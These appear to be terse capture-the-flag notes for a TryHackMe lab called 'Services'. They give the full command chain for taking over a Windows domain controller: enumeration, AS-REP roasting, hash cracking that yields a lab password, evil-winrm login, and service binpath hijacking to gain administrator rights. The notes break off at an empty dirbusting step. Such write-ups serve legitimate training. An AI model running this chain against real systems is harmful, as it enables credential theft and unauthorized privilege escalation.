# Services-THM-Walkthrough

export IP=10.10.117.221
export myIP=10.13.24.71

sudo nmap -v --min-rate 10000 <Target's IP address> -p- | grep open

sort nmap results
cat tmp | sed 's/\// /g' | awk '{print $1}' | tr "\n" ","

full scan:
sudo nmap -v -sVC -oN nmap.txt <Target's IP address> -p <ports>

roasting:
smbclient -L //$IP/
smbmap -u 'anonymous' -H $IP

ENUMERATION:
walk the port 80 website, create name list

KERBRUTE:
username enum

kerbrute userenum --dc $IP -d services.local users.txt

AS-REP ROASTING WITH GetNPUsers.py:
GetNPUsers.py -dc-ip $IP -request 'services.local/' -usersfile users.txt -format hashcat

j.rock hash is revealed!

Use hashcat to crack the hash:
hashcat -m 18200 hash.txt rockyou.txt
j.rock:Serviceworks1

EVIL-WINRM
login with:
evil-winrm -i $IP -u j.rock -p Serviceworks1

LOCAL ENUMERATION
whoami /all

build a revshell exe binary with this github:
https://github.com/dev-frog/C-Reverse-Shell

BINPATH HIJACKING
sc.exe config cfn-hup binpath="net localgroup administrators j.rock /add"
start and stop the service
log out/in

CHANGE THE ADMIN PASSWORD
net user administrator hellothisisatest123!

log out and back in with admin 


└─$ nmap -F $IP                                                 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 20:35 EDT
Nmap scan report for 10.10.38.22
Host is up (0.24s latency).
Not shown: 92 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 2.23 seconds

Nmap scan report for 10.10.38.22
Host is up (0.22s latency).
Not shown: 65492 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
53/tcp    open     domain
80/tcp    open     http
88/tcp    open     kerberos-sec
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
389/tcp   open     ldap
390/tcp   filtered uis
445/tcp   open     microsoft-ds
464/tcp   open     kpasswd5
593/tcp   open     http-rpc-epmap
636/tcp   open     ldapssl
2080/tcp  filtered autodesk-nlm
3268/tcp  open     globalcatLDAP
3269/tcp  open     globalcatLDAPssl
3389/tcp  open     ms-wbt-server
5340/tcp  filtered unknown
5985/tcp  open     wsman
9389/tcp  open     adws
12346/tcp filtered netbus
14884/tcp filtered unknown
25455/tcp filtered unknown
25719/tcp filtered unknown
32436/tcp filtered unknown
36588/tcp filtered unknown
37768/tcp filtered unknown
42301/tcp filtered unknown
47001/tcp open     winrm
49664/tcp open     unknown
49665/tcp open     unknown
49666/tcp open     unknown
49667/tcp open     unknown
49669/tcp open     unknown
49670/tcp open     unknown
49671/tcp open     unknown
49673/tcp open     unknown
49674/tcp open     unknown
49676/tcp open     unknown
49694/tcp open     unknown
49702/tcp open     unknown
53481/tcp filtered unknown
63399/tcp filtered unknown
63410/tcp open     unknown
65353/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 3848.32 seconds

dirbusting:


